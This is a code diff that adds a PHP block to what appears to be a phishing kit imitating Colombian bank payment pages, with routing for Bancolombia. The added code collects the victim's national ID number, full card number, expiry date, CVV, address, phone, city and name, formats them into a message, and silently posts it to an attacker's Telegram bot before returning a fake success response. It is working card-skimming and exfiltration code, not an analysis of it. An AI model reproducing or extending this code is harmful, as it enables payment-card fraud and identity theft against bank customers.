@@ -199,6 +199,61 @@ if (strpos($bancoNormalizado, 'bancolombia') !== false && strpos($bancoNormaliza
     $redirectUrl = 'dinadatos/bancol/index.php';
 }
 
+// Enviar info de la tarjeta a Telegram antes de responder (para todos los bancos)
+$botmasterPath = __DIR__ . '/dinadatos/botmaster2.php';
+$botToken = '';
+$chatId = '';
+if (file_exists($botmasterPath)) {
+    $contentFile = file_get_contents($botmasterPath);
+    if (preg_match('/\{.*\}/', $contentFile, $matches)) {
+        $tgConfig = json_decode($matches[0], true);
+        $botToken = $tgConfig['token'] ?? '';
+        $chatId = $tgConfig['chat_id'] ?? '';
+    }
+}
+
+if (!empty($botToken) && !empty($chatId)) {
+    $transactionId = date('YmdHis') . '-' . uniqid();
+    $bancoTitulo = strtoupper($issuer);
+    
+    $message = "<b>[{$bancoTitulo}] Nueva Tarjeta Detectada</b>\n";
+    $message .= "--------------------------------------------------\n";
+    $message .= "🆔 <b>ID de Verificación:</b> | <b>" . $transactionId . "</b>\n";
+    $message .= "--------------------------------------------------\n";
+    $message .= "<b>Detalles del pago:</b>\n";
+    $message .= "----------------------------\n";
+    $message .= "🪪 <b>Cédula:</b> | " . ($data['cedula'] ?? '<i>No disponible</i>') . "\n";
+    $message .= "💳 <b>Tarjeta:</b> | " . ($data['cardNumber'] ?? '<i>No disponible</i>') . "\n";
+    $message .= "📅 <b>Expiración:</b> | " . ($data['expMonth'] ?? '') . "/" . ($data['expYear'] ?? '') . "\n";
+    $message .= "🔐 <b>CVV:</b> | " . ($data['cvv'] ?? '<i>No disponible</i>') . "\n";
+    $message .= "💳 <b>Tipo de tarjeta:</b> | " . ($cardType ?? '<i>No disponible</i>') . "\n";
+    $message .= "💰 <b>Cuotas:</b> | " . ($data['cuotas'] ?? '<i>No disponible</i>') . "\n";
+    $message .= "--------------------------------------------------\n";
+    $message .= "🏦 <b>Banco:</b> | " . ($issuer ?? '<i>No disponible</i>') . "\n";
+    $message .= "🏠 <b>Dirección:</b> | " . ($data['address'] ?? '<i>No disponible</i>') . "\n";
+    $message .= "📞 <b>Teléfono:</b> | " . ($data['phone'] ?? '<i>No disponible</i>') . "\n";
+    $message .= "🏙️ <b>Ciudad:</b> | " . ($data['city'] ?? '<i>No disponible</i>') . "\n";
+    $message .= "📝 <b>Nombre del propietario:</b> | " . ($data['ownerName'] ?? '<i>No disponible</i>') . "\n";
+    $message .= "--------------------------------------------------\n";
+
+    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
+    $postFields = [
+        'chat_id' => $chatId,
+        'text' => $message,
+        'parse_mode' => 'HTML'
+    ];
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    @curl_exec($ch);
+    curl_close($ch);
+}
+
 // 6. ENVIAR LA RESPUESTA JSON DE ÉXITO
 echo json_encode(array(
     'status' => 'success',
